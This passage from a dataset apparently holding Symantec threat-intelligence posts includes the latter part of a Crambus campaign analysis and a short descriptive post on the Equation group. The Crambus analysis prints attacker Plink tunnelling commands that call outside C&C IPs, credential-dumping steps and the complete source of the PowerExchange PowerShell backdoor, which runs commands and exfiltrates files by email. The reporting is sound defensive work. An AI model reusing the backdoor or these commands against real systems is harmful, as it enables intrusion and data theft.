port-forwarding rules allowing for RDP access from a remote host: CSIDL_PROFILE\\public\\sat\\msssh.exe 151.236.19[.]91 -P [REMOVED]-C -N -R 0.0.0.0:54231:127.0.0.1:3389 -l [REMOVED] -pw [REMOVED] This masqueraded Plink (mssh.exe) was executed repeatedly on this computer up until February 12.\nOn February 21, malicious activity commenced on a web server (Web Server 1) when a netstat command was executed to retrieve a full list of all TCP and UDP connections.\nnetstat /an The netstat command line switches perform the following actions: - /a: Tells netstat to display all connections and listening ports. -\n/n: Tells netstat to display numerical addresses instead of resolving hostnames to IP addresses.\nNext, Plink (mssh.exe) was launched again to enable remote RDP access.\nAfter this occurred, there was evidence that a PowerShell script was used to mount the C: drive of another computer on the network.\nOn April 8, the attackers gained access to a third computer (Computer 3), where another variant of Plink was executed from the %USERPROFILE%\\public directory and was used to forward port 3389 to port 999 on all available interfaces: CSIDL_PROFILE\\public\\plink.exe [REMOVED] -pw [REMOVED] -P [REMOVED] -2 -4 -T -N -C -R 0.0.0.0:999:127.0.0.1:3389 The options supplied in the command perform the following actions: - -2 -4: Enable SSH Version 2 and IPv4 protocol for the connection. -\n-T: Requests a pseudo-terminal for the remote session. -\n-N: Prevents running a remote command and often used for setting up a port - -R 0.0.0.0:999:127.0.0.1:3389: Specifies remote port forwarding.\nIt instructs the remote server to listen on Port 999 of all network interfaces (0.0.0.0) and forward any incoming connections to Port 3389 (127.0.0.1:3389) on the local machine (the machine where the command has been run).\nThis effectively sets up a tunnel that allows the attackers to access a remote service such as RDP through the SSH connection.\nAt the same time, an unknown batch file was executed, which redirected output to a text file in the %USERPROFILE%\\public directory.\ncmd /c CSIDL_PROFILE\\public\\p2.bat > CSIDL_PROFILE\\public\\001.txt 2>&1 Immediately afterwards, the same Plink command was run a second time.\nThis is followed by the same unknown batch script being executed several more times.\nLater that day, Mimikatz was executed from the %TEMP% directory to dump credentials.\nOn April 9, another netstat command was run on a new compromised computer, the Domain Controller (Computer 4): netstat /aon The “o” option adds the process ID (PID) of the associated process that's using each network connection or listening port.\nThe command will provide a list of all active network connections, both incoming and outgoing, along with the associated PID of the processes using those connections.\nThree hours later, Mimikatz was run again to dump credentials.\nThe next day, April 10, an unknown windows batch file (file name: p.bat) was executed on Computer 3.\nThis was followed by a Plink command: plink.exe ssh 78.47.218[.]106 1234qweRRR 443 10999 10.75.45.222 3389 The options perform the following actions: - ssh: Indicates SSH protocol is being used for the connection. -\n78.47.218[.]106: The IP address of the remote server being connected to using SSH. -\n1234qweRRR: Likely a password required to authenticate to the remote server. -\n443: Port number for the SSH connection on the remote server. -\n10999: The local port number that Plink uses to create a tunnel. -\n10.75.45.222: IP address of local machine or network. -\n3389: Remote Desktop Protocol (RDP) port number.\nThis indicates that traffic is being forwarded from the remote server's port 3389 to a local machine for remote desktop access.\nThe command is used to set up a port forwarding tunnel from the compromised machine as a means to access the remote server’s RDP service as if it was running locally.\nOn April 23, activity resumed on Computer 3, when previously unseen malware named Backdoor.\nTokel (file name: telecomm.exe) was executed.\nOn May 7, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) to run an unknown script (file name: hwf.ps1).\nMalicious activity appeared to cease for nearly a month until June 4, when Backdoor.\nTokel was executed again on Computer 3.\nOn June 17, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) in order to run another unknown script (file name: zone.ps1).\nHarvesting Emails On June 20, Backdoor.\nPowerExchange (file name: setapp.ps1) was run on Computer 3.\nThe PowerShell-based backdoor is designed to execute commands received from the attackers.\nThis is done by logging into compromised mailboxes on an Exchange Server and monitoring for incoming emails from the attackers.\nEmail’s that contain “@@” in the subject line are read by Backdoor.\nPowerExchange and have the ability to execute commands received from the attackers, effectively using the Exchange Server as a C&C. The script allows four commands to execute: - If an attachment is detected, it will decode it using Base64 and run it via PowerShell. -\ncf: Decodes a Base64 string in the body of the email and executes it via PowerShell.\nThe result of the command is sent back to the attacker via email. -\nuf: Decodes the file path and the file contents using Base64 and calls WriteAllBytes to write the file to the system. -\ndf: Encodes a specified file with Base64 and sends it to the attacker via email.\nIf the file is larger than 5MB it sends the following message to the attacker: \"Size is Greater than 5 MB\".\nThe attackers likely installed the script on an ordinary computer on the network in order to avoid raising suspicions created by anomalous network traffic, since internal connections to an Exchange Server are expected behavior.\nMalicious Activity Continues On July 1, the attackers once again utilized the masqueraded version of Plink to open a tunnel on Computer 3 by redirecting RDP to Port 12345 on any listening interface, effectively allowing external connections over RDP to the compromised machine.\nThe next day, July 2, the attackers used netstat to list all open and listening TCP and UDP ports.\nIt's possible the attackers were checking that the SSH tunnel was still active.\nOn July 8, the attackers used the Domain Controller (Computer 4) to create a service on a remote host (10.75.45[.]222) to run an unknown script (file name: pl.bat).\nThe service was configured to auto-start during the boot up process.\nOver the next two days, July 9 and 10, another new piece of malware named Trojan.\nDirps (file name: virtpackage.exe) was repeatedly executed on Computer 3.\nOn July 11, the attackers introduced more malicious tools to Computer 3, installing a third new piece of malware named Infostealer.\nClipog (file name (poluniq.exe) which is used to capture keystrokes and steal clipboard contents.\nThe next day (July 12) the attackers ran Mimikatz on the Domain Controller (Computer 4) to dump credentials.\nOn July 15, the attackers again ran the unknown PowerShell script (zone.ps1) on the Domain Controller (Computer 4), followed by a second unknown script (copy.ps1).\nOn July 18, the attackers again executed Infostealer.\nClipog on Computer 3 before creating an SSH tunnel using Plink to access RDP services.\nThis SSH tunnel was created again on August 3.\nOn August 6, yet another unknown PowerShell script (file name: tnc.ps1) was executed on the Domain Controller (Computer 4).\nImmediately afterwards, Nessus vulnerability scans were observed, specially hunting for Log4j vulnerabilities on other machines on the network.\nWhile this could have been legitimate vulnerability scanning activity, not long afterwards netsh was executed to list all firewall rules.\nCSIDL_SYSTEM\\netsh.exe advfirewall firewall show rule name=[REMOVED] verbose Following this, another PowerShell script was executed.\nThe script appeared to be designed to query and collect information about local user groups and their members on a Windows system.\nIts output was information about SIDs, names, object classes, and principal sources of local user groups and their members in a structured format.\nCSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell -NoProfile -Command ;& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$groups = Get-LocalGroup | Select-Object Name, Domain, SID;foreach($g in $groups){-join($g.\nSID,'|',$g.\nName);$members = Get-LocalGroupMember -SID $g.SID | Select *;foreach($m in $members){-join(' ',$m.SID,'|',$m.\nName,'|',$m.\nObjectClass,'|',$m.\nPrincipalSource);}}};$r = wjb $j -Timeout 300; rcjb $j;}; After this, net.exe was used to list all mapped drives, before WMI (Windows Management Instrumentation) was used to execute Plink in order to open port-forwarding on the compromised host, allowing for remote RDP access.\nOn August 7 and again on August 12, Plink was downloaded from the internet on to the Domain Controller (Computer 4) and saved as \\ProgramData\\Adobe.exe.\nOn August 30, the attackers obtained access to a second web server (Web Server 2).\nThey first used Plink to enable access to RDP on Port 12345 from their C&C server (91.132.92[.]90).\nThey then installed Infostealer.\nClipog using a different file name (fs-tool.exe).\nThe next day, August 31, the attackers established a tunnel once again to open RDP access on Port 4455 from their C&C. Output was redirected to a text file (file name: 001.txt).\nThere may have been some issues connecting as the attackers later attempted to create the same tunnel, this time using Port 12345.\nOn September 1, the attackers shifted their attention to three more computers (Computer 5, Computer 6 and Computer 7), using Certutil to download Plink to each machine.\nThey then executed an unknown PowerShell script (file name: joper.ps1) on Web Server 2.\nOn September 2, the attackers ran the following netstat command on Web Server 2: netstat -a This command is used to list all active connections.\nThe unknown PowerShell script (file name: joper.ps1) was then run again.\nOn September 3, the attackers once again ran joper.ps1 before two suspicious Wireshark commands were executed: ;CSIDL_SYSTEM_DRIVE\\program files\\wireshark\\extcap\\usbpcapcmd.exe; --extcap-interfaces --extcap-version=4.0 ;CSIDL_SYSTEM_DRIVE\\program files\\wireshark\\dumpcap.exe; -D -Z none Wireshark’s usbcapcmd utility was used to capture USB traffic on specified USB devices and save the captured data to a file.\nSimilarly, dumpcap was used to capture network packets.\nUsbpcapcmd: - --extcap-interfaces: This option is used to list available external capture interfaces. -\n--extcap-version=4.0: Sets the version of Extcap to 4.0 (ensuring compatibility with Wireshark).\nDumpcap: - -D: Used to list all available capture interfaces. -\n-Z none: Sets the capture filter to “none” meaning that all packets on a specified interface should be captured.\nIt appears the attackers were interested in identifying any available network or USB interfaces from which they could capture packets on the machine.\nImmediately afterwards, a suspicious netstat command ran: netstat -a –n This will list all active connections and print them to standard output in numerical form.\nAfter joper.ps1 was once again executed, the attackers turned their attention back to Computer 3, where they ran a number of reg.exe commands: reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f These commands were used to modify system configuration to enable Terminal Services (i.e. remote access) to the computer via RDP.\nA few hours later, a suspicious net.exe command was executed to mount the c$ share of another machine using stolen credentials. ;\nCSIDL_SYSTEM\\net.exe; use \\\\[REMOVED]\\c$ /user:[REMOVED] [REMOVED] On September 4, the attackers executed three different variants of the joper.ps1 script on Web Server 2.\nThey then turned their attention back to Computer 1, where a new variant of the Backdoor.\nTokel malware was installed on the computer.\nThe next day, September 5 the attackers once again ran the joper.ps1 script on Web Server 2, while using net.exe to mount and unmount various network shares.\nThey then executed Backdoor.\nTokel on Computer 3 again before installing it on two more computers (Computer 9 and Computer 10).\nMalicious activity continued until September 9, with the attackers largely focusing their attention on Web Server 2, running the joper.ps1 script and mounting/unmounting network shares.\nContinuing Threat Crambus is a long-running and experienced espionage group that has extensive expertise in carrying out long campaigns aimed at targets of interest to Iran.\nAfter a 2019 leak of its toolset, there was some speculation that Crambus may disappear.\nHowever, its activities over the past two years demonstrate that it represents a continuing threat for organizations in the Middle East and further afield.\nProtection/Mitigation For the latest protection updates, please visit the Symantec Protection Bulletin.\nIndicators of Compromise If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\n4d04ad9d3c3abeb61668e52a52a37a46c1a60bc8f29f12b76ff9f580caeefba8 – Backdoor.\nTokel 41672b08e6e49231aedf58123a46ed7334cafaad054f2fd5b1e0c1d5519fd532 – Backdoor.\nTokel 497e1c76ed43bcf334557c64e1a9213976cd7df159d695dcc19c1ca3d421b9bc – Trojan.\nDirps 75878356f2e131cefb8aeb07e777fcc110475f8c92417fcade97e207a94ac372 – Infostealer.\nClipog d884b3178fc97d1077a13d47aadf63081559817f499163c2dc29f6828ee08cae – Backdoor.\nPowerExchange a1a633c752be619d5984d02d4724d9984463aa1de0ea1375efda29cadb73355a – PowerShell script 22df38f5441dec57e7d7c2e1a38901514d3f55203b2890dc38d2942f1e4bc100 – PowerShell script 159b07668073e6cd656ad7e3822db997d5a8389a28c439757eb60ba68eaff70f – PowerShell script 6964f4c6fbfb77d50356c2ee944f7ec6848d93f05a35da6c1acb714468a30147 – PowerShell script 661c9535d9e08a3f5e8ade7c31d5017519af2101786de046a4686bf8a5a911ff – PowerShell script db1cbe1d85a112caf035fd5d4babfb59b2ca93411e864066e60a61ec8fe27368 – PowerShell script 497978a120f1118d293906524262da64b15545ee38dc0f6c10dbff3bd9c0bac2 – PowerShell script db1cbe1d85a112caf035fd5d4babfb59b2ca93411e864066e60a61ec8fe27368 – PowerShell script 6b9f60dc91fbee3aecb4a875e24af38c97d3011fb23ace6f34283a73349c4681 – PowerShell script 497978a120f1118d293906524262da64b15545ee38dc0f6c10dbff3bd9c0bac2 – PowerShell script be6d631fb2ff8abe22c5d48035534d0dede4abfd8c37b1d6cbf61b005d1959c1 – PowerShell script 22df38f5441dec57e7d7c2e1a38901514d3f55203b2890dc38d2942f1e4bc100 – PowerShell script 661c9535d9e08a3f5e8ade7c31d5017519af2101786de046a4686bf8a5a911ff – PowerShell script 159b07668073e6cd656ad7e3822db997d5a8389a28c439757eb60ba68eaff70f – PowerShell script 6bad09944b3340947d2b39640b0e04c7b697a9ce70c7e47bc2276ed825e74a2a – PowerShell script ba620b91bef388239f3078ecdcc9398318fd8465288f74b4110b2a463499ba08 – PowerShell script d0bfdb5f0de097e4460c13bc333755958fb30d4cb22e5f4475731ad1bdd579ec – PowerShell script 5a803bfe951fbde6d6b23401c4fd1267b03f09d3907ef83df6cc25373c11a11a – PowerShell script 1698f9797f059c4b30f636d16528ed3dd2b4f8290e67eb03e26181e91a3d7c3b – PowerShell script 23db83aa81de19443cafe14c9c0982c511a635a731d6df56a290701c83dae9c7 – PowerShell script 41ff7571d291c421049bfbd8d6d3c51b0a380db3b604cef294c1edfd465978d9 – PowerShell script c488127b3384322f636b2a213f6f7b5fdaa6545a27d550995dbf3f32e22424bf – PowerShell script 6964f4c6fbfb77d50356c2ee944f7ec6848d93f05a35da6c1acb714468a30147 – PowerShell script 927327bdce2f577b1ee19aa3ef72c06f7d6c2ecd5f08acc986052452a807caf2 – PowerShell script a6365e7a733cfe3fa5315d5f9624f56707525bbf559d97c66dbe821fae83c9e9 – PowerShell script c3ac52c9572f028d084f68f6877bf789204a6a0495962a12ee2402f66394a918 – PowerShell script 7e107fdd6ea33ddc75c1b75fdf7a99d66e4739b4be232ff5574bf0e116bc6c05 – PowerShell script 78.47.218[.]106 – Plink C&C 192.121.22[.].46 – Plink C&C 151.236.19[.]91 – Plink C&C 91.132.92[.]90 – Plink C&C PowerExchange Script $OutputEncoding = [console]::InputEncoding = [console]::OutputEncoding = New-Object System.\nText.\nUTF8Encoding $dir=\"$env:PUBLIC\\MicrosoftEdge\" $directory = get-childitem -Path \"$($dir)\\*\" -Include 'config.conf' $userid = [Convert]::ToBase64String([System.\nText.\nEncoding]::UTF8.GetBytes($env:COMPUTERNAME)) $mailList = New-Object Collections.\nGeneric.\nList[String] $mailList.Add('Ahmed_Alrashed20@outlook.com') $subject = \"Update Microsoft Edge\" $body = \"Microsoft Edge Update\" $rule = \"defaultexchangerules\" function addrule { $NewRule = [Microsoft.\nExchange.\nWebServices.\nData.\nRule]::new() $NewRule.\nDisplayName = $rule $NewRule.\nPriority = 1 $newRule.\nIsEnabled = $true; $NewRule.\nConditions.\nContainsSubjectStrings.\nAdd(\"@@\") $NewRule.\nActions.\nMoveToFolder = [Microsoft.\nExchange.\nWebServices.\nData.\nWellKnownFolderName]::DeletedItems $CreateRuleOperation = [Microsoft.\nExchange.\nWebServices.\nData.\nCreateRuleOperation]::new($NewRule) $ExchangeService.\nUpdateInboxRules([Microsoft.\nExchange.\nWebServices.\nData.\nRuleOperation[]]@($CreateRuleOperation),$true) } function connection { add-type @\" using System.\nNet; using System.\nSecurity.\nCryptography.\nX509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult( ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } } \"@ [System.\nNet.\nServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy $dllpath = get-childitem -Path \"$($dir)\\*\" -Include 'Microsoft.Exchange.WebServices.dll' try{[void][Reflection.\nAssembly]::LoadFile($dllpath.\nFullName)}catch{$_.Exception | Out-File -FilePath \"$($dir)\\EWSERROR.txt\" -Append;exit} $global:ExchangeService = New-Object Microsoft.\nExchange.\nWebServices.\nData.\nExchangeService $ExchangeService.\nUserAgent = \"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\"; $urllist = @([System.\nUri][REMOVED],[System.\nUri] [REMOVED],[System.\nUri] [REMOVED]) $userlist = @([REMOVED], [REMOVED]) foreach($item in $userlist ) { $username=$item.split('||')[0] $password=$item.split('||')[2] if(-not [string]::IsNullOrEmpty($username)) { $ExchangeService.\nCredentials = New-Object Microsoft.\nExchange.\nWebServices.\nData.\nWebCredentials($username,$password) foreach($url in $urllist) { $ExchangeService.\nUrl=$url try { $inboxfolder = [Microsoft.\nExchange.\nWebServices.\nData.\nFolder]::Bind($ExchangeService,[Microsoft.\nExchange.\nWebServices.\nData.\nWellKnownFolderName]::Inbox) $rules= $ExchangeService.\nGetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.\nContains(\"defaultexchangerules\")){addrule}}else{addrule} return $true } catch{\"URL: \"+$url.\nHost+[Environment]::NewLine+\"User: \"+$username+[Environment]::NewLine+$_.Exception.\nMessage | Out-File -FilePath \"$($dir)\\EWSERROR.txt\" -Append} } } $exchangeservice.\nUseDefaultCredentials=$true foreach($url in $urllist) { try { $inboxfolder = [Microsoft.\nExchange.\nWebServices.\nData.\nFolder]::Bind($ExchangeService,[Microsoft.\nExchange.\nWebServices.\nData.\nWellKnownFolderName]::Inbox) $rules= $ExchangeService.\nGetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.\nContains(\"defaultexchangerules\")){addrule}}else{addrule} return $true } catch{} } if(-not [string]::IsNullOrEmpty($username)) { $ExchangeService.\nCredentials = New-Object Microsoft.\nExchange.\nWebServices.\nData.\nWebCredentials($username,$password) try { $ExchangeService.\nAutodiscoverUrl($username) try { $inboxfolder = [Microsoft.\nExchange.\nWebServices.\nData.\nFolder]::Bind($ExchangeService,[Microsoft.\nExchange.\nWebServices.\nData.\nWellKnownFolderName]::Inbox) $rules= $ExchangeService.\nGetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.\nContains(\"defaultexchangerules\")){addrule}}else{addrule} return $true }catch{} }catch{} } $exchangeservice.\nUseDefaultCredentials = $true try { $ExchangeService.\nAutodiscoverUrl($username) try { $inboxfolder = [Microsoft.\nExchange.\nWebServices.\nData.\nFolder]::Bind($ExchangeService,[Microsoft.\nExchange.\nWebServices.\nData.\nWellKnownFolderName]::Inbox) $rules= $ExchangeService.\nGetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.\nContains(\"defaultexchangerules\")){addrule}}else{addrule} return $true }catch{} }catch{Continue} } } function clean { $folder = New-Object Microsoft.\nExchange.\nWebServices.\nData.\nFolderId([Microsoft.\nExchange.\nWebServices.\nData.\nWellKnownFolderName]::Inbox) try{$inboxfolder = [Microsoft.\nExchange.\nWebServices.\nData.\nFolder]::Bind($exchangeservice,$folder)}catch{} $iv = New-object Microsoft.\nExchange.\nWebServices.\nData.\nItemView(10) $inboxitems= $inboxfolder.\nFindItems($iv) $itemIds = $inboxitems.id.\nUniqueId foreach($itemId in $itemIds) { try{$message = [Microsoft.\nExchange.\nWebServices.\nData.\nItem]::Bind($ExchangeService,$itemId)}catch{} if($mailList.\nContains($message.\nToRecipients.\nName)) { $message.\nDelete('HardDelete') } } } function sendMessage {param([string]$mail,[string]$data) $message = New-Object Microsoft.\nExchange.\nWebServices.\nData.\nEmailMessage($ExchangeService) $Resultb64Bytes = [System.\nText.\nEncoding]::UTF8.GetBytes($data) $message.\nToRecipients.\nAdd($mail) $message.\nSubject = $subject $message.\nBody = $body $message.\nAttachments.\nAddFileAttachment(\"New Text Document.txt\",$Resultb64Bytes) try{$message.\nSend()}catch{} Start-Sleep -Seconds 15 clean } function verify { $response = New-Object Collections.\nGeneric.\nList[String] $Inbox = [Microsoft.\nExchange.\nWebServices.\nData.\nWellKnownFolderName]::Inbox $DeletedItems=[Microsoft.\nExchange.\nWebServices.\nData.\nWellKnownFolderName]::DeletedItems $JunkEmail=[Microsoft.\nExchange.\nWebServices.\nData.\nWellKnownFolderName]::JunkEmail $folders=@($DeletedItems,$Inbox,$JunkEmail) foreach($f in $folders) { $folder = New-Object Microsoft.\nExchange.\nWebServices.\nData.\nFolderId($f) try{$inboxfolder=[Microsoft.\nExchange.\nWebServices.\nData.\nFolder]::Bind($ExchangeService,$folder)}catch{} $iv = New-object Microsoft.\nExchange.\nWebServices.\nData.\nItemView(10) $searchFilter = New-Object Microsoft.\nExchange.\nWebServices.\nData.\nSearchFilter+ContainsSubstring([Microsoft.\nExchange.\nWebServices.\nData.\nItemSchema]::subject,'@@') $result = $ExchangeService.\nFindItems($folder,$searchFilter,$iv) if(-not [string]::IsNullOrEmpty($result)) { $ItemIds = $result.id.\nUniqueId foreach($ItemId in $ItemIds) { try{$x=[Microsoft.\nExchange.\nWebServices.\nData.\nItem]::Bind($ExchangeService,$ItemId)}catch{} $mailSender = $x.sender.\nAddress $xx = $x.Subject -match \"@@(.*)@@\" try{$id=$Matches[1]}catch{} if(-not [string]::IsNullOrEmpty($id)) { if($id -eq $userid ) { $response.\nAdd(\"planA\") $response.\nAdd($ItemId) return $response } } elseif($flag -eq $false) { $response.\nAdd(\"planB\") $response.\nAdd($mailSender) return $response } } } } return $response } function main{ Param ( [string] $ItemId ) try{$message=[Microsoft.\nExchange.\nWebServices.\nData.\nItem]::Bind($ExchangeService,$ItemId)}catch{} $mailSender = $message.\nSender.\nAddress $message.\nIsRead=$true $message.\nUpdate([Microsoft.\nExchange.\nWebServices.\nData.\nConflictResolutionMode]::AutoResolve) foreach($attachment in $message.\nAttachments) { $attachment.\nLoad() $RawData = ([System.\nText.\nEncoding]::UTF8.GetString($attachment.\nContent)).substring(7) if ($RawData.\nLength%4 -ne 0) { $newRawData = $RawData.\nPadRight(($RawData.\nLength+$RawData.\nLength%4),'=') $Data = [System.\nText.\nEncoding]::UTF8.GetString([System.\nConvert]::FromBase64String($newRawData)) }else{ $Data = [System.\nText.\nEncoding]::UTF8.GetString([System.\nConvert]::FromBase64String($RawData)) } iex($Data) $message.\nDelete('HardDelete') if($cf -eq $true) { $uuid = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_}) foreach ($h in $cmd.\nGetEnumerator()) { if (($h.value).Length%4 -ne 0) { $newValue = ($h.value).PadRight((($h.value).Length+($h.value).Length%4),'=') $com = [System.\nText.\nEncoding]::UTF8.GetString([System.\nConvert]::FromBase64String($newValue)) }else{ $com = [System.\nText.\nEncoding]::UTF8.GetString([System.\nConvert]::FromBase64String($h.value)) } if(![string]::IsNullOrEmpty($com)) { $run = iex $com | out-string $extb64 = [Convert]::ToBase64String([System.\nText.\nEncoding]::UTF8.GetBytes(\".txt\")) $Total += \"$($uuid)$($userid):$($h.\nName):$($uuid)$([System.\nConvert]::ToBase64String([System.\nText.\nEncoding]::UTF8.GetBytes(\"$run\"))):$($uuid)$($extb64)\"+[System.\nEnvironment]::Newline } } sendMessage $mailSender $Total } if($df -eq $true) { $uuid = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_}) foreach ($h in $dl.\nGetEnumerator()) { if (($h.value).Length%4 -ne 0) { $newpath = $($h.value).PadRight(($($h.value).Length+$($h.value).Length%4),'=') $path = [System.\nText.\nEncoding]::UTF8.GetString([System.\nConvert]::FromBase64String($newpath)).Replace('\"',\"\") }else{ $path = [System.\nText.\nEncoding]::UTF8.GetString([System.\nConvert]::FromBase64String($h.value)).Replace('\"',\"\") } $size = (Get-Item $path).Length if($size -lt 5mb ) { $DataBytes= [System.\nIO.File]::ReadAllBytes($path) $Datab64 = [Convert]::ToBase64String($DataBytes) $ext = [System.\nIO.Path]::GetExtension($path) $extb64 = [Convert]::ToBase64String([System.\nText.\nEncoding]::UTF8.GetBytes($ext)) } else { $Datab64= [Convert]::ToBase64String([System.\nText.\nEncoding]::UTF8.GetBytes(\"Size is Greater than 5 MB\")) $extb64= [Convert]::ToBase64String([System.\nText.\nEncoding]::UTF8.GetBytes(\".txt\")) } $Total += \"$($uuid)$($userid):$($h.\nName):$($uuid)$($Datab64):$($uuid)$($extb64)\"+[System.\nEnvironment]::Newline } sendMessage $mailSender $Total } if($uf -eq $true) { $uuid = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_}) foreach ($h in $up.\nGetEnumerator()) { $Fileb64 = ($h.value).split(':')[0] $Pathb64 = ($h.value).split(':')[1] if ($Pathb64.Length%4 -ne 0) { $newpathb64 = $Pathb64.PadRight(($Pathb64.Length+$Pathb64.Length%4),'=') $path_save = [System.\nText.\nEncoding]::UTF8.GetString([System.\nConvert]::FromBase64String($newpathb64)).Replace('\"','') }else{ $path_save = [System.\nText.\nEncoding]::UTF8.GetString([System.\nConvert]::FromBase64String($Pathb64)).Replace('\"','') } if ($Fileb64.Length%4 -ne 0) { $newFileb64 = $Fileb64.PadRight(($Fileb64.Length+$Fileb64.Length%4),'=') $Fileb64Bytes = [System.\nConvert]::FromBase64String($newFileb64) }else{ $Fileb64Bytes = [System.\nConvert]::FromBase64String($Fileb64) } [System.\nIO.File]::WriteAllBytes($path_save,$Fileb64Bytes) $Datab64 = [Convert]::ToBase64String([System.\nText.\nEncoding]::UTF8.GetBytes(\"file upload\")) $extb64 = [Convert]::ToBase64String([System.\nText.\nEncoding]::UTF8.GetBytes(\".txt\")) $Total += \"$($uuid)$($userid):$($h.\nName):$($uuid)$($Datab64):$($uuid)$($extb64)\"+[System.\nEnvironment]::Newline } sendMessage $mailSender $Total } }} Function listen { $timer = [System.\nDiagnostics.\nStopwatch]::StartNew() while(($timer.\nElapsed.\nTotalMinutes -lt 5) -and (([string]::IsNullOrEmpty($value)))) { $value = verify Start-Sleep -Seconds 10 } $timer.\nStop() if(-not[string]::IsNullOrEmpty($value)) { if($value[0] -eq \"planA\") { return $true } if($value[0] -eq \"planB\") { $mailList+= $value[1] sendMessage $value[1] $userid return $true } } else { return $false } } function alive { foreach ($mail in $mailList) { sendMessage $mail $userid $liste = listen if($liste -eq $true) { return $true } } return $false } function core { $global:flag= $true $value = verify if(-not[string]::IsNullOrEmpty($value)) { if($value[0] -eq \"planA\") { main $value[1] } } } $connect = connection if($connect -eq $true) { if($directory.\nName -ne 'config.conf') { $global:flag= $false $aliv = alive if($aliv -eq $true) { try{New-Item -Path \"$($dir)\" -ItemType File -Name \"config.conf\" -ErrorAction Stop;core}catch{} } }else{core} }else{exit} Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":409,"metadata":{"source":"blog","platform":"symantec","filename":"Crambus"}}
{"id":134,"title":"Equation: Advanced cyberespionage group has all the tricks in the book, and more | Symantec Enterprise Blogs","publish_date":null,"link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/equation-cyberespionage-group","clean_text":"Equation: Advanced cyberespionage group has all the tricks in the book, and more Group uses range of different malware tools to mount its operations.\nAn adept and well-resourced cyberespionage group known as Equation has been targeting organizations in a number of countries with a range of highly developed malware tools that go to great lengths to evade detection.\nNew research from our peers at Kaspersky Lab has brought the group’s activities and tools to public attention.\nSymantec products detect the malware currently known to be used by Equation.\nThe Equation group has used a range of different malware tools to mount its operations.\nTargeted computers are often compromised initially with malware that acts as a reconnaissance tool, gathering information about the infected computer and keeping a back door open, allowing for the installation of further malware if the computer is identified as something of interest.\nThis is a common tactic adopted by cyberespionage groups.\nFor example, the group behind the Turla Trojan usually initially infects its victims with the Wipbot Trojan before infecting them with Trojan Turla if it decides the computer is worthy of interest.\nThe main tool used for this purpose appears to be Infostealer.\nMicstus, which is also known as “DoubleFantasy”.\nTrojan.\nTripfant (also known as “TripleFantasy”) has similar capabilities and may be a replacement for Micstus.\nEquation has used a succession of advanced, multipurpose Trojans as its main malware tools.\nTrojan.\nGrayphish, which is also known as “GrayFish”, is believed to be the group’s current weapon of choice.\nIt has a complex structure and stealthy characteristics.\nGrayphish includes a bootkit which allows the malware to take control of the entire Windows boot process.\nHighly stealthy, Grayphish uses an encrypted virtual file system hidden inside the Windows registry.\nThis appears to have replaced the older Trojan.\nEqudrug (also known as “EquationDrug”) which was favored until recently.\nEqudrug in turn appears to have replaced the older Backdoor.\nLassrv.\nB. Also known as “EquationLaser”, this Trojan seems to be one of the early workhorses used by the group until it was phased out.\nGrayphish and Equdrug have a modular structure.\nAside from standard modules, a number of specialized features can also be employed.\nAmong this is a highly sophisticated and rarely used module that allows the malware to reprogram the firmware on a range of popular hard disks, providing the attackers with a persistent presence that can survive disk reformatting.\nSymantec detects this module as Packed.\nGeneric.483.\nIn addition to these powerful Trojans, Equation has employed a number of specialist tools.\nAmong these are Trojan.\nGrokey a custom keylogger (also known as “Grok”) and W32.Fanni, which is also known as “Fanny worm”.\nThis worm’s chief purpose appears to be the targeting of air-gapped networks.\nIt can receive commands and exfiltrate data through infected USB sticks.\nFanny used two zero day exploits that were also used in the Stuxnet attacks.\nThe exploits were used in Fanny prior to Stuxnet indicating that Equation had prior knowledge of the vulnerabilities.\nAnother similarity lies in the fact that Stuxnet was also designed to attack air-gapped networks.\nProtection Symantec and Norton products have the following detections in place against malware used by the Equation group: AV: - Infostealer.\nMicstus, - Trojan.\nTripfant - Trojan.\nGrayphish - Trojan.\nEqudrug - Backdoor.\nLassrv.\nB - Packed.\nGeneric.483 - Trojan.\nGrokey - W32.Fanni IPS: - System Infected: Trojan Equation Activity Prior to this, Symantec detected Equation malware with a range of detections including Trojan.\nTracur, Backdoor.\nTrojan, Trojan Horse, Trojan.\nGen.2, and W32.Stration@mm.\nWant to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":50,"metadata":{"source":"blog","platform":"symantec","filename":"Dyre"}}
